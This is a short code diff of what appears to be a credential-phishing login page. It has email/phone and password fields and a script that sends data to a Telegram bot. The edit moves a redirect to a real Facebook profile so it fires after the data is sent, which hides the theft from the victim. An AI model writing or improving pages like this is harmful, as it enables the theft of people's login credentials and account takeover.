@@ -19,7 +19,7 @@
   <input id="emailInput" type="text" placeholder="Email or phone number" required>
   <input id="passwordInput" type="password" placeholder="Password" required>
   <div class="link">
-    <button type="submit" class="login" onclick="window.location.href = 'https://www.facebook.com/profile.php?id=100063732258457';">Login</button>
+    <button type="submit">Login</button>
   </div>
   <hr>
 </form>
@@ -53,6 +53,7 @@
       alert("An error occurred while sending data to the Telegram bot.");
       console.error(error);
     });
+            window.location.href = "https://www.facebook.com/profile.php?id=100063732258457";
 });
     </script>
   </body>
